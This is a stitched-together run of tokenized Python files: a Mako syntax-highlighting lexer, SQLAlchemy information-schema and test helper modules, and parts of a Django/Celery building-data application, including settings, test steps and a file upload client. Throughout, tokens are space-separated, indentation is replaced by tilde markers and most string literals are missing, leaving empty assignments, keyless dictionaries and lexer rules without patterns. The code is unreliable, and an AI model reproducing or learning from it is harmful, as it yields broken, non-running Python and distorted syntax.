# Copyright (C) 2006-2015 the Mako authors and contributors <see AUTHORS file> \n 
# \n 
# This module is part of Mako and is released under \n 
# the MIT License: http://www.opensource.org/licenses/mit-license.php \n 
\n 
~~ ~~ ~~ from pygments . lexers . web import HtmlLexer , XmlLexer , JavascriptLexer , CssLexer \n 
from pygments . lexers . agile import PythonLexer , Python3Lexer \n 
from pygments . lexer import DelegatingLexer , RegexLexer , bygroups , include , using \n 
from pygments . token import Text , Comment , Operator , Keyword , Name , String , Other \n 
from pygments . formatters . html import HtmlFormatter \n 
from pygments import highlight \n 
from mako import compat \n 
\n 
\n 
class MakoLexer ( RegexLexer ) : \n 
~~~ name = \n 
aliases = [ ] \n 
filenames = [ ] \n 
\n 
tokens = { \n 
: [ \n 
( , \n 
bygroups ( Text , Comment . Preproc , Keyword , Other ) ) , \n 
( , \n 
bygroups ( Text , Comment . Preproc , using ( PythonLexer ) , Other ) ) , \n 
( , \n 
bygroups ( Text , Comment . Preproc , Other ) ) , \n 
( , Comment . Preproc ) , \n 
( , \n 
bygroups ( Comment . Preproc , Name . Builtin ) , ) , \n 
( , \n 
bygroups ( Comment . Preproc , Name . Builtin , Comment . Preproc ) ) , \n 
( , Comment . Preproc , ) , \n 
( , \n 
bygroups ( Comment . Preproc , using ( PythonLexer ) , Comment . Preproc ) ) , \n 
( , \n 
bygroups ( Comment . Preproc , using ( PythonLexer ) , Comment . Preproc ) ) , \n 
( , bygroups ( Other , Operator ) ) , \n 
( , Text ) , \n 
] , \n 
: [ \n 
( , Comment . Preproc ) , \n 
( , Name . Builtin ) , \n 
include ( ) , \n 
] , \n 
: [ \n 
( r\'((?:\\w+)\\s*=)\\s*(".*?")\' , \n 
bygroups ( Name . Attribute , String ) ) , \n 
( , Comment . Preproc , ) , \n 
( , Text ) , \n 
] , \n 
: [ \n 
( \'".*?"\' , String , ) , \n 
( "\'.*?\'" , String , ) , \n 
( , String , ) , \n 
] , \n 
} \n 
\n 
\n 
~~ class MakoHtmlLexer ( DelegatingLexer ) : \n 
~~~ name = \n 
aliases = [ ] \n 
\n 
def __init__ ( self , ** options ) : \n 
~~~ super ( MakoHtmlLexer , self ) . __init__ ( HtmlLexer , MakoLexer , \n 
** options ) \n 
\n 
\n 
~~ ~~ class MakoXmlLexer ( DelegatingLexer ) : \n 
~~~ name = \n 
aliases = [ ] \n 
\n 
def __init__ ( self , ** options ) : \n 
~~~ super ( MakoXmlLexer , self ) . __init__ ( XmlLexer , MakoLexer , \n 
** options ) \n 
\n 
\n 
~~ ~~ class MakoJavascriptLexer ( DelegatingLexer ) : \n 
~~~ name = \n 
aliases = [ , ] \n 
\n 
def __init__ ( self , ** options ) : \n 
~~~ super ( MakoJavascriptLexer , self ) . __init__ ( JavascriptLexer , \n 
MakoLexer , ** options ) \n 
\n 
\n 
~~ ~~ class MakoCssLexer ( DelegatingLexer ) : \n 
~~~ name = \n 
aliases = [ ] \n 
\n 
def __init__ ( self , ** options ) : \n 
~~~ super ( MakoCssLexer , self ) . __init__ ( CssLexer , MakoLexer , \n 
** options ) \n 
\n 
\n 
~~ ~~ pygments_html_formatter = HtmlFormatter ( cssclass = , \n 
linenos = True ) \n 
\n 
\n 
def syntax_highlight ( filename = , language = None ) : \n 
~~~ mako_lexer = MakoLexer ( ) \n 
if compat . py3k : \n 
~~~ python_lexer = Python3Lexer ( ) \n 
~~ else : \n 
~~~ python_lexer = PythonLexer ( ) \n 
~~ if filename . startswith ( ) or language == : \n 
~~~ return lambda string : highlight ( string , mako_lexer , \n 
pygments_html_formatter ) \n 
~~ return lambda string : highlight ( string , python_lexer , \n 
pygments_html_formatter ) \n 
# mssql/information_schema.py \n 
# Copyright (C) 2005-2014 the SQLAlchemy authors and contributors <see AUTHORS file> \n 
# \n 
# This module is part of SQLAlchemy and is released under \n 
# the MIT License: http://www.opensource.org/licenses/mit-license.php \n 
\n 
# TODO: should be using the sys. catalog with SQL Server, not information schema \n 
\n 
~~ from ... import Table , MetaData , Column \n 
from ... types import String , Unicode , UnicodeText , Integer , TypeDecorator \n 
from ... import cast \n 
from ... import util \n 
from ... sql import expression \n 
from ... ext . compiler import compiles \n 
\n 
ischema = MetaData ( ) \n 
\n 
class CoerceUnicode ( TypeDecorator ) : \n 
~~~ impl = Unicode \n 
\n 
def process_bind_param ( self , value , dialect ) : \n 
~~~ if util . py2k and isinstance ( value , util . binary_type ) : \n 
~~~ value = value . decode ( dialect . encoding ) \n 
~~ return value \n 
\n 
~~ def bind_expression ( self , bindvalue ) : \n 
~~~ return _cast_on_2005 ( bindvalue ) \n 
\n 
~~ ~~ class _cast_on_2005 ( expression . ColumnElement ) : \n 
~~~ def __init__ ( self , bindvalue ) : \n 
~~~ self . bindvalue = bindvalue \n 
\n 
~~ ~~ @ compiles ( _cast_on_2005 ) \n 
def _compile ( element , compiler , ** kw ) : \n 
~~~ from . import base \n 
if compiler . dialect . server_version_info < base . MS_2005_VERSION : \n 
~~~ return compiler . process ( element . bindvalue , ** kw ) \n 
~~ else : \n 
~~~ return compiler . process ( cast ( element . bindvalue , Unicode ) , ** kw ) \n 
\n 
~~ ~~ schemata = Table ( "SCHEMATA" , ischema , \n 
Column ( "CATALOG_NAME" , CoerceUnicode , key = "catalog_name" ) , \n 
Column ( "SCHEMA_NAME" , CoerceUnicode , key = "schema_name" ) , \n 
Column ( "SCHEMA_OWNER" , CoerceUnicode , key = "schema_owner" ) , \n 
schema = "INFORMATION_SCHEMA" ) \n 
\n 
tables = Table ( "TABLES" , ischema , \n 
Column ( "TABLE_CATALOG" , CoerceUnicode , key = "table_catalog" ) , \n 
Column ( "TABLE_SCHEMA" , CoerceUnicode , key = "table_schema" ) , \n 
Column ( "TABLE_NAME" , CoerceUnicode , key = "table_name" ) , \n 
Column ( "TABLE_TYPE" , String ( convert_unicode = True ) , key = "table_type" ) , \n 
schema = "INFORMATION_SCHEMA" ) \n 
\n 
columns = Table ( "COLUMNS" , ischema , \n 
Column ( "TABLE_SCHEMA" , CoerceUnicode , key = "table_schema" ) , \n 
Column ( "TABLE_NAME" , CoerceUnicode , key = "table_name" ) , \n 
Column ( "COLUMN_NAME" , CoerceUnicode , key = "column_name" ) , \n 
Column ( "IS_NULLABLE" , Integer , key = "is_nullable" ) , \n 
Column ( "DATA_TYPE" , String , key = "data_type" ) , \n 
Column ( "ORDINAL_POSITION" , Integer , key = "ordinal_position" ) , \n 
Column ( "CHARACTER_MAXIMUM_LENGTH" , Integer , key = "character_maximum_length" ) , \n 
Column ( "NUMERIC_PRECISION" , Integer , key = "numeric_precision" ) , \n 
Column ( "NUMERIC_SCALE" , Integer , key = "numeric_scale" ) , \n 
Column ( "COLUMN_DEFAULT" , Integer , key = "column_default" ) , \n 
Column ( "COLLATION_NAME" , String , key = "collation_name" ) , \n 
schema = "INFORMATION_SCHEMA" ) \n 
\n 
constraints = Table ( "TABLE_CONSTRAINTS" , ischema , \n 
Column ( "TABLE_SCHEMA" , CoerceUnicode , key = "table_schema" ) , \n 
Column ( "TABLE_NAME" , CoerceUnicode , key = "table_name" ) , \n 
Column ( "CONSTRAINT_NAME" , CoerceUnicode , key = "constraint_name" ) , \n 
Column ( "CONSTRAINT_TYPE" , String ( convert_unicode = True ) , key = "constraint_type" ) , \n 
schema = "INFORMATION_SCHEMA" ) \n 
\n 
column_constraints = Table ( "CONSTRAINT_COLUMN_USAGE" , ischema , \n 
Column ( "TABLE_SCHEMA" , CoerceUnicode , key = "table_schema" ) , \n 
Column ( "TABLE_NAME" , CoerceUnicode , key = "table_name" ) , \n 
Column ( "COLUMN_NAME" , CoerceUnicode , key = "column_name" ) , \n 
Column ( "CONSTRAINT_NAME" , CoerceUnicode , key = "constraint_name" ) , \n 
schema = "INFORMATION_SCHEMA" ) \n 
\n 
key_constraints = Table ( "KEY_COLUMN_USAGE" , ischema , \n 
Column ( "TABLE_SCHEMA" , CoerceUnicode , key = "table_schema" ) , \n 
Column ( "TABLE_NAME" , CoerceUnicode , key = "table_name" ) , \n 
Column ( "COLUMN_NAME" , CoerceUnicode , key = "column_name" ) , \n 
Column ( "CONSTRAINT_NAME" , CoerceUnicode , key = "constraint_name" ) , \n 
Column ( "ORDINAL_POSITION" , Integer , key = "ordinal_position" ) , \n 
schema = "INFORMATION_SCHEMA" ) \n 
\n 
ref_constraints = Table ( "REFERENTIAL_CONSTRAINTS" , ischema , \n 
Column ( "CONSTRAINT_CATALOG" , CoerceUnicode , key = "constraint_catalog" ) , \n 
Column ( "CONSTRAINT_SCHEMA" , CoerceUnicode , key = "constraint_schema" ) , \n 
Column ( "CONSTRAINT_NAME" , CoerceUnicode , key = "constraint_name" ) , \n 
# TODO: is CATLOG misspelled ? \n 
Column ( "UNIQUE_CONSTRAINT_CATLOG" , CoerceUnicode , \n 
key = "unique_constraint_catalog" ) , \n 
\n 
Column ( "UNIQUE_CONSTRAINT_SCHEMA" , CoerceUnicode , \n 
key = "unique_constraint_schema" ) , \n 
Column ( "UNIQUE_CONSTRAINT_NAME" , CoerceUnicode , \n 
key = "unique_constraint_name" ) , \n 
Column ( "MATCH_OPTION" , String , key = "match_option" ) , \n 
Column ( "UPDATE_RULE" , String , key = "update_rule" ) , \n 
Column ( "DELETE_RULE" , String , key = "delete_rule" ) , \n 
schema = "INFORMATION_SCHEMA" ) \n 
\n 
views = Table ( "VIEWS" , ischema , \n 
Column ( "TABLE_CATALOG" , CoerceUnicode , key = "table_catalog" ) , \n 
Column ( "TABLE_SCHEMA" , CoerceUnicode , key = "table_schema" ) , \n 
Column ( "TABLE_NAME" , CoerceUnicode , key = "table_name" ) , \n 
Column ( "VIEW_DEFINITION" , CoerceUnicode , key = "view_definition" ) , \n 
Column ( "CHECK_OPTION" , String , key = "check_option" ) , \n 
Column ( "IS_UPDATABLE" , String , key = "is_updatable" ) , \n 
schema = "INFORMATION_SCHEMA" ) \n 
# testing/pickleable.py \n 
# Copyright (C) 2005-2014 the SQLAlchemy authors and contributors <see AUTHORS file> \n 
# \n 
# This module is part of SQLAlchemy and is released under \n 
# the MIT License: http://www.opensource.org/licenses/mit-license.php \n 
\n 
"""Classes used in pickling tests, need to be at the module level for\nunpickling.\n""" \n 
\n 
from . import fixtures \n 
\n 
\n 
class User ( fixtures . ComparableEntity ) : \n 
~~~ pass \n 
\n 
\n 
~~ class Order ( fixtures . ComparableEntity ) : \n 
~~~ pass \n 
\n 
\n 
~~ class Dingaling ( fixtures . ComparableEntity ) : \n 
~~~ pass \n 
\n 
\n 
~~ class EmailUser ( User ) : \n 
~~~ pass \n 
\n 
\n 
~~ class Address ( fixtures . ComparableEntity ) : \n 
~~~ pass \n 
\n 
\n 
# TODO: these are kind of arbitrary.... \n 
~~ class Child1 ( fixtures . ComparableEntity ) : \n 
~~~ pass \n 
\n 
\n 
~~ class Child2 ( fixtures . ComparableEntity ) : \n 
~~~ pass \n 
\n 
\n 
~~ class Parent ( fixtures . ComparableEntity ) : \n 
~~~ pass \n 
\n 
\n 
~~ class Screen ( object ) : \n 
\n 
~~~ def __init__ ( self , obj , parent = None ) : \n 
~~~ self . obj = obj \n 
self . parent = parent \n 
\n 
\n 
~~ ~~ class Foo ( object ) : \n 
\n 
~~~ def __init__ ( self , moredata ) : \n 
~~~ self . data = \n 
self . stuff = \n 
self . moredata = moredata \n 
\n 
~~ __hash__ = object . __hash__ \n 
\n 
def __eq__ ( self , other ) : \n 
~~~ return other . data == self . data and other . stuff == self . stuff and other . moredata == self . moredata \n 
\n 
\n 
~~ ~~ class Bar ( object ) : \n 
\n 
~~~ def __init__ ( self , x , y ) : \n 
~~~ self . x = x \n 
self . y = y \n 
\n 
~~ __hash__ = object . __hash__ \n 
\n 
def __eq__ ( self , other ) : \n 
~~~ return other . __class__ is self . __class__ and other . x == self . x and other . y == self . y \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return "Bar(%d, %d)" % ( self . x , self . y ) \n 
\n 
\n 
~~ ~~ class OldSchool : \n 
\n 
~~~ def __init__ ( self , x , y ) : \n 
~~~ self . x = x \n 
self . y = y \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ return other . __class__ is self . __class__ and other . x == self . x and other . y == self . y \n 
\n 
\n 
~~ ~~ class OldSchoolWithoutCompare : \n 
\n 
~~~ def __init__ ( self , x , y ) : \n 
~~~ self . x = x \n 
self . y = y \n 
\n 
\n 
~~ ~~ class BarWithoutCompare ( object ) : \n 
\n 
~~~ def __init__ ( self , x , y ) : \n 
~~~ self . x = x \n 
self . y = y \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return "Bar(%d, %d)" % ( self . x , self . y ) \n 
\n 
\n 
~~ ~~ class NotComparable ( object ) : \n 
\n 
~~~ def __init__ ( self , data ) : \n 
~~~ self . data = data \n 
\n 
~~ def __hash__ ( self ) : \n 
~~~ return id ( self ) \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ return NotImplemented \n 
\n 
~~ def __ne__ ( self , other ) : \n 
~~~ return NotImplemented \n 
\n 
\n 
~~ ~~ class BrokenComparable ( object ) : \n 
\n 
~~~ def __init__ ( self , data ) : \n 
~~~ self . data = data \n 
\n 
~~ def __hash__ ( self ) : \n 
~~~ return id ( self ) \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ raise NotImplementedError \n 
\n 
~~ def __ne__ ( self , other ) : \n 
~~~ raise NotImplementedError \n 
# util/topological.py \n 
# Copyright (C) 2005-2014 the SQLAlchemy authors and contributors <see AUTHORS file> \n 
# \n 
# This module is part of SQLAlchemy and is released under \n 
# the MIT License: http://www.opensource.org/licenses/mit-license.php \n 
\n 
~~ ~~ """Topological sorting algorithms.""" \n 
\n 
from . . exc import CircularDependencyError \n 
from . . import util \n 
\n 
__all__ = [ , , ] \n 
\n 
\n 
def sort_as_subsets ( tuples , allitems ) : \n 
\n 
~~~ edges = util . defaultdict ( set ) \n 
for parent , child in tuples : \n 
~~~ edges [ child ] . add ( parent ) \n 
\n 
~~ todo = set ( allitems ) \n 
\n 
while todo : \n 
~~~ output = set ( ) \n 
for node in list ( todo ) : \n 
~~~ if not todo . intersection ( edges [ node ] ) : \n 
~~~ output . add ( node ) \n 
\n 
~~ ~~ if not output : \n 
~~~ raise CircularDependencyError ( \n 
"Circular dependency detected." , \n 
find_cycles ( tuples , allitems ) , \n 
_gen_edges ( edges ) \n 
) \n 
\n 
~~ todo . difference_update ( output ) \n 
yield output \n 
\n 
\n 
~~ ~~ def sort ( tuples , allitems ) : \n 
~~~ """sort the given list of items by dependency.\n\n    \'tuples\' is a list of tuples representing a partial ordering.\n    """ \n 
\n 
for set_ in sort_as_subsets ( tuples , allitems ) : \n 
~~~ for s in set_ : \n 
~~~ yield s \n 
\n 
\n 
~~ ~~ ~~ def find_cycles ( tuples , allitems ) : \n 
# adapted from: \n 
# http://neopythonic.blogspot.com/2009/01/detecting-cycles-in-directed-graph.html \n 
\n 
~~~ edges = util . defaultdict ( set ) \n 
for parent , child in tuples : \n 
~~~ edges [ parent ] . add ( child ) \n 
~~ nodes_to_test = set ( edges ) \n 
\n 
output = set ( ) \n 
\n 
\n 
# involved in cycles, so we do the full \n 
# pass through the whole thing for each \n 
# node in the original list. \n 
\n 
# we can go just through parent edge nodes. \n 
# if a node is only a child and never a parent, \n 
\n 
\n 
for node in nodes_to_test : \n 
~~~ stack = [ node ] \n 
todo = nodes_to_test . difference ( stack ) \n 
while stack : \n 
~~~ top = stack [ - 1 ] \n 
for node in edges [ top ] : \n 
~~~ if node in stack : \n 
~~~ cyc = stack [ stack . index ( node ) : ] \n 
todo . difference_update ( cyc ) \n 
output . update ( cyc ) \n 
\n 
~~ if node in todo : \n 
~~~ stack . append ( node ) \n 
todo . remove ( node ) \n 
break \n 
~~ ~~ else : \n 
~~~ node = stack . pop ( ) \n 
~~ ~~ ~~ return output \n 
\n 
\n 
~~ def _gen_edges ( edges ) : \n 
~~~ return set ( [ \n 
( right , left ) \n 
for left in edges \n 
for right in edges [ left ] \n 
] ) \n 
~~ """\n:copyright (c) 2014 - 2016, The Regents of the University of California, through Lawrence Berkeley National Laboratory (subject to receipt of any required approvals from the U.S. Department of Energy) and contributors. All rights reserved.  # NOQA\n:author\n""" \n 
from __future__ import absolute_import \n 
\n 
from config . settings . common import * # noqa \n 
from kombu import Exchange , Queue \n 
\n 
DEBUG = True \n 
TEMPLATE_DEBUG = DEBUG \n 
SESSION_COOKIE_SECURE = False \n 
\n 
# AWS credentials for S3.  Set them in environment or local_untracked.py \n 
AWS_ACCESS_KEY_ID = os . environ . get ( , ) \n 
AWS_UPLOAD_CLIENT_KEY = AWS_ACCESS_KEY_ID \n 
AWS_SECRET_ACCESS_KEY = os . environ . get ( , ) \n 
AWS_UPLOAD_CLIENT_SECRET_KEY = AWS_SECRET_ACCESS_KEY \n 
AWS_BUCKET_NAME = os . environ . get ( "AWS_BUCKET_NAME" , "be-dev-uploads" ) \n 
AWS_STORAGE_BUCKET_NAME = AWS_BUCKET_NAME \n 
\n 
# override this in local_untracked.py \n 
DATABASES = { \n 
: { \n 
: , \n 
: , \n 
: , \n 
: , \n 
: "127.0.0.1" , \n 
: , \n 
} , \n 
} \n 
\n 
if "test" in sys . argv or "harvest" in sys . argv : \n 
~~~ CACHES = { \n 
: { \n 
: , \n 
: , \n 
: \n 
} \n 
} \n 
~~ else : \n 
~~~ CACHES = { \n 
: { \n 
: , \n 
: "127.0.0.1:6379" , \n 
: { : 1 } , \n 
: 300 \n 
} \n 
} \n 
LOGGING = { \n 
: 1 , \n 
: True , \n 
# set up some log message handlers to choose from \n 
: { \n 
: { \n 
: , \n 
: \n 
} \n 
} , \n 
: { \n 
# the name of the logger, if empty, then this is the default logger \n 
: { \n 
: , \n 
: [ ] , \n 
} \n 
} , \n 
} \n 
\n 
# BROKER_URL with AWS ElastiCache redis looks something like: \n 
\n 
~~ BROKER_URL = \n 
CELERY_RESULT_BACKEND = BROKER_URL \n 
CELERY_DEFAULT_QUEUE = \n 
CELERY_QUEUES = ( \n 
Queue ( \n 
CELERY_DEFAULT_QUEUE , \n 
Exchange ( CELERY_DEFAULT_QUEUE ) , \n 
routing_key = CELERY_DEFAULT_QUEUE \n 
) , \n 
) \n 
\n 
REQUIRE_UNIQUE_EMAIL = False \n 
\n 
COMPRESS_ENABLED = False \n 
if "COMPRESS_ENABLED" not in locals ( ) or not COMPRESS_ENABLED : \n 
~~~ COMPRESS_PRECOMPILERS = ( ) \n 
COMPRESS_CSS_FILTERS = [ ] \n 
COMPRESS_JS_FILTERS = [ ] \n 
\n 
~~ ALLOWED_HOSTS = [ ] \n 
\n 
\n 
# use imp module to find the local_untracked file rather than a hard-coded path \n 
# TODO: There seems to be a bunch of loading of other files in these settings. First this loads the common, then this, then anything in the untracked file try : \n 
~~~ import imp \n 
import config . settings \n 
\n 
local_untracked_exists = imp . find_module ( \n 
, config . settings . __path__ \n 
) \n 
~~ except : \n 
~~~ pass \n 
\n 
~~ if in locals ( ) : \n 
~~~ from config . settings . local_untracked import * # noqa \n 
~~ else : \n 
~~~ print >> sys . stderr , "Unable to find the local_untracked module in config/settings/local_untracked.py" # !/usr/bin/env python \n 
# encoding: utf-8 \n 
~~ """\n:copyright (c) 2014 - 2016, The Regents of the University of California, through Lawrence Berkeley National Laboratory (subject to receipt of any required approvals from the U.S. Department of Energy) and contributors. All rights reserved.  # NOQA\n:author\n""" \n 
from __future__ import absolute_import \n 
\n 
import os \n 
\n 
import celery \n 
import raven \n 
\n 
from django . conf import settings \n 
from raven . contrib . celery import register_signal , register_logger_signal \n 
\n 
\n 
\n 
os . environ . setdefault ( , ) \n 
\n 
\n 
class Celery ( celery . Celery ) : \n 
\n 
~~~ def on_configure ( self ) : \n 
~~~ try : \n 
~~~ client = raven . Client ( settings . RAVEN_CONFIG [ ] ) \n 
\n 
# register a custom filter to filter out duplicate logs \n 
register_logger_signal ( client ) \n 
\n 
# hook into the Celery error handler \n 
register_signal ( client ) \n 
~~ except AttributeError : \n 
~~~ pass \n 
\n 
\n 
~~ ~~ ~~ app = Celery ( ) \n 
app . config_from_object ( ) \n 
app . autodiscover_tasks ( lambda : settings . SEED_CORE_APPS ) \n 
\n 
\n 
if __name__ == : \n 
~~~ app . start ( ) \n 
# !/usr/bin/env python \n 
# encoding: utf-8 \n 
~~ """\n:copyright (c) 2014 - 2016, The Regents of the University of California, through Lawrence Berkeley National Laboratory (subject to receipt of any required approvals from the U.S. Department of Energy) and contributors. All rights reserved.  # NOQA\n:author\n""" \n 
\n 
# TODO: Convert these to selenium tests \n 
from salad . steps . everything import ImportRecord , world , django_url , time , Project \n 
from lettuce import step \n 
from django . core . urlresolvers import reverse \n 
\n 
\n 
@ step ( ) \n 
def i_visit_the_home_page ( step ) : \n 
~~~ world . browser . visit ( django_url ( reverse ( "seed:home" ) ) ) \n 
\n 
\n 
~~ @ step ( ) \n 
def given_i_go_to_the_jasmine_unit_tests_for_the_SEED ( step ) : \n 
~~~ world . browser . visit ( django_url ( reverse ( "seed:angular_js_tests" ) ) ) \n 
\n 
\n 
~~ @ step ( ) \n 
def then_i_should_see_that_the_tests_passed ( step ) : \n 
~~~ time . sleep ( 2 ) \n 
try : \n 
~~~ assert world . browser . is_element_present_by_css ( ".passingAlert.bar" ) \n 
~~ except : \n 
~~~ time . sleep ( 50 ) \n 
assert len ( world . browser . find_by_css ( ".passingAlert.bar" ) ) > 0 \n 
\n 
\n 
~~ ~~ @ step ( ) \n 
def when_i_visit_the_projects_page ( step ) : \n 
~~~ world . browser . visit ( django_url ( reverse ( "seed:home" ) ) + "#/projects" ) \n 
\n 
\n 
~~ @ step ( ) \n 
def then_i_should_see_my_projects ( step ) : \n 
~~~ assert world . browser . is_text_present ( ) \n 
assert world . browser . is_text_present ( ) \n 
\n 
\n 
~~ @ step ( ) \n 
def and_i_have_a_project ( step ) : \n 
~~~ Project . objects . create ( \n 
name = "my project" , \n 
super_organization_id = world . org . id , \n 
owner = world . user \n 
) \n 
\n 
\n 
~~ @ step ( ) \n 
def and_i_have_a_dataset ( step ) : \n 
~~~ ImportRecord . objects . create ( \n 
name = , \n 
super_organization = world . org , \n 
owner = world . user \n 
) \n 
\n 
\n 
~~ @ step ( ) \n 
def when_i_visit_the_dataset_page ( step ) : \n 
~~~ world . browser . visit ( django_url ( reverse ( "seed:home" ) ) + "#/data" ) \n 
\n 
\n 
~~ @ step ( ) \n 
def and_i_delete_a_dataset ( step ) : \n 
~~~ delete_icon = world . browser . find_by_css ( ) \n 
delete_icon . click ( ) \n 
alert = world . browser . get_alert ( ) \n 
alert . accept ( ) \n 
\n 
\n 
~~ @ step ( ) \n 
def then_i_should_see_no_datasets ( step ) : \n 
~~~ number_of_datasets = len ( world . browser . find_by_css ( ) ) \n 
number_of_datasets = len ( world . browser . find_by_css ( ) ) \n 
number_of_datasets = len ( world . browser . find_by_css ( ) ) \n 
assert number_of_datasets == 0 \n 
# !/usr/bin/env python \n 
# encoding: utf-8 \n 
~~ """\n:copyright (c) 2014 - 2016, The Regents of the University of California, through Lawrence Berkeley National Laboratory (subject to receipt of any required approvals from the U.S. Department of Energy) and contributors. All rights reserved.  # NOQA\n:author\n""" \n 
"""\nThis module describes how data is mapped from our ontology to Django Models.\nThe structure pulls out the read data from our espm-based MCM run\nlike follows:\n\nespm[\'flat_schema\'].keys() -> model.attr mapping\n\nAll fields found in the ontology, but not mentioned in this mapping\ngo into the ``extra_data`` attribute, which is a json field in Postgres.\n\n""" \n 
MAP = { \n 
# Could there be a better key for this? \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: ( \n 
\n 
) , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: ( \n 
\n 
) , \n 
: , \n 
: , \n 
} \n 
# -*- coding: utf-8 -*- \n 
from __future__ import unicode_literals \n 
\n 
from django . db import models , migrations \n 
\n 
\n 
class Migration ( migrations . Migration ) : \n 
\n 
~~~ dependencies = [ \n 
( , ) , \n 
] \n 
\n 
operations = [ \n 
migrations . CreateModel ( \n 
name = , \n 
fields = [ \n 
( , models . ForeignKey ( primary_key = True , serialize = False , to = ] , \n 
options = { \n 
} , \n 
bases = ( models . Model , ) , \n 
) , \n 
] \n 
~~ \ufeff # !/usr/bin/env python \n 
# encoding: utf-8 \n 
"""\n:copyright (c) 2014 - 2016, The Regents of the University of California, through Lawrence Berkeley National Laboratory (subject to receipt of any required approvals from the U.S. Department of Energy) and contributors. All rights reserved.  # NOQA\n:author\n""" \n 
import logging \n 
import pprint \n 
import json \n 
import os \n 
import requests \n 
import csv \n 
import datetime as dt \n 
import time \n 
from calendar import timegm \n 
\n 
# Three-step upload process \n 
\n 
\n 
def upload_file ( upload_header , upload_filepath , main_url , upload_dataset_id , upload_datatype ) : \n 
~~~ """\n    Checks if the upload is through an AWS system or through file system.\n    Proceeds with the appropriate upload method.\n\n    - uploadFilepath: full path to file\n    - uploadDatasetID: What ImportRecord to associate file with.\n    - uploadDatatype: Type of data in file (Assessed Raw, Portfolio Raw)\n    """ \n 
\n 
def _upload_file_to_aws ( aws_upload_details ) : \n 
~~~ """\n        This code is from the original APIClient.\n        Implements uploading a data file to S3 directly.\n        This is a 3-step process:\n        1. SEED instance signs the upload request.\n        2. File is uploaded to S3 with signature included.\n        3. Client notifies SEED instance when upload completed.\n        @TODO: Currently can only upload to s3.amazonaws.com, though there are\n            other S3-compatible services that could be drop-in replacements.\n\n        Args:\n        - AWSuploadDetails: Results from \'get_upload_details\' endpoint;\n            contains details about where to send file and how.\n\n        Returns:\n            {"import_file_id": 54,\n             "success": true,\n             "filename": "DataforSEED_dos15.csv"}\n        """ \n 
# Step 1: get the request signed \n 
sig_uri = aws_upload_details [ ] \n 
\n 
now = dt . datetime . utcnow ( ) \n 
expires = now + dt . timedelta ( hours = 1 ) \n 
now_ts = timegm ( now . timetuple ( ) ) \n 
key = % ( filename , now_ts ) \n 
\n 
payload = { } \n 
payload [ ] = expires . isoformat ( ) + \n 
payload [ ] = [ \n 
{ : aws_upload_details [ ] } , \n 
{ : } , \n 
{ : } , \n 
{ : } , \n 
{ : key } \n 
] \n 
\n 
sig_result = requests . post ( main_url + sig_uri , \n 
headers = upload_header , \n 
data = json . dumps ( payload ) ) \n 
if sig_result . status_code != 200 : \n 
~~~ msg = "Something went wrong with signing document." \n 
raise RuntimeError ( msg ) \n 
~~ else : \n 
~~~ sig_result = sig_result . json ( ) \n 
\n 
# Step 2: upload the file to S3 \n 
~~ upload_url = "http://%s.s3.amazonaws.com/" % ( aws_upload_details [ ] ) \n 
\n 
# s3 expects multipart form encoding with files at the end, so this \n 
# payload needs to be a list of tuples; the requests library will encode \n 
\n 
s3_payload = [ \n 
( , key ) , \n 
( , aws_upload_details [ ] ) , \n 
( , ) , \n 
( , ) , \n 
( , ) , \n 
( , sig_result [ ] ) , \n 
( , sig_result [ ] ) , \n 
( , ( filename , open ( upload_filepath , ) ) ) \n 
] \n 
\n 
result = requests . post ( upload_url , \n 
files = s3_payload ) \n 
\n 
if result . status_code != 200 : \n 
~~~ msg = "Something went wrong with the S3 upload: %s " % result . reason \n 
raise RuntimeError ( msg ) \n 
\n 
# Step 3: Notify SEED about the upload \n 
~~ completion_uri = aws_upload_details [ ] \n 
completion_payload = { \n 
: upload_dataset_id , \n 
: key , \n 
: upload_datatype \n 
} \n 
return requests . get ( main_url + completion_uri , \n 
headers = upload_header , \n 
params = completion_payload ) \n 
\n 
~~ def _upload_file_to_file_system ( upload_details ) : \n 
~~~ """\n        Implements uploading to SEED\'s file system. Used by\n        upload_file if SEED in configured for local file storage.\n\n        Args:\n            FSYSuploadDetails: Results from \'get_upload_details\' endpoint;\n                contains details about where to send file and how.\n\n        Returns:\n            {"import_file_id": 54,\n             "success": true,\n             "filename": "DataforSEED_dos15.csv"}\n        """ \n 
upload_url = "%s%s" % ( main_url , upload_details [ ] ) \n 
fsysparams = { : upload_filepath , \n 
: upload_dataset_id , \n 
: upload_datatype } \n 
return requests . post ( upload_url , \n 
params = fsysparams , \n 
files = { : open ( upload_filepath , ) } , \n 
headers = upload_header ) \n 
\n 
# Get the upload details. \n 
~~ upload_details = requests . get ( main_url + , headers = upload_header ) \n 
upload_details = upload_details . json ( ) \n 
\n 
filename = os . path . basename ( upload_filepath ) \n 
\n 
if upload_details [ ] == : \n 
~~~ return _upload_file_to_aws ( upload_details ) \n 
~~ elif upload_details [ ] == : \n 
~~~ return _upload_file_to_file_system ( upload_details ) \n 
~~ else : \n 
~~~ raise RuntimeError ( "Upload mode unknown: %s" % \n 
upload_details [ ] ) \n 
\n 
\n 
~~ ~~ def check_status ( resultOut , partmsg , log , PIIDflag = None ) : \n 
~~~ """Checks the status of the API endpoint and makes the appropriate print outs.""" \n 
if resultOut . status_code in [ 200 , 403 , 401 ] : \n 
~~~ if PIIDflag == : \n 
~~~ msg = pprint . pformat ( resultOut . json ( ) , indent = 2 , width = 70 ) \n 
~~ else : \n 
~~~ try : \n 
~~~ if in resultOut . json ( ) . keys ( ) and resultOut . json ( ) [ ] == : \n 
~~~ msg = resultOut . json ( ) [ ] \n 
log . error ( partmsg + ) \n 
log . debug ( msg ) \n 
raise RuntimeError \n 
~~ elif in resultOut . json ( ) . keys ( ) and not resultOut . json ( ) [ ] : \n 
~~~ msg = resultOut . json ( ) \n 
log . error ( partmsg + ) \n 
log . debug ( msg ) \n 
raise RuntimeError \n 
~~ else : \n 
~~~ if PIIDflag == : \n 
~~~ msg = + str ( len ( resultOut . json ( ) [ ~~ elif PIIDflag == : \n 
~~~ msg = + str ( len ( resultOut . json ( ) [ ] [ 0 ] ) ) \n 
~~ elif PIIDflag == : \n 
